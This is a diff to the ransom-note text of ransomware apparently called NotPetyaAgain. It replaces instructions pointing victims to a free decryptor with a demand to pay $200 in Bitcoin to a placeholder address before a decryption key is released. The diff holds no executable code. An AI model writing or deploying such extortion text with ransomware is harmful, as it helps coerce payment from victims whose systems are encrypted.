@@ -5,13 +5,12 @@ military grade encryption algorithm known as AES.
 However, the key used for the encryption and decryption has now been 
 discarded and lost except for the victim ID used to generate the key.
 
-Luckily for you, to decrypt your system, follow these 4 simple steps:
-
-1) Swear on god that you will NOT run any more malware!
-2) Go to not-petya-again-decryptor.github.io or the NotPetyaUEFI repo 
-on GitHub.
-3) Enter your PVID (provided below) via the website or script and the
-decryption key will be generated and provided.
+To decrypt and regain access to your system, please follow these 4 
+simple steps:
+1) Swear on god that you will NOT fall for any more malware!
+2) Pay $200 via Bitcoin to [insert payment method here]
+3) Enter your PVID (provided below) via the provided website and your 
+payment will be validated and the decryption key will be provided.
 4) Enter the decryption key below and NotPetyaAgain will decrypt your
 system.
 
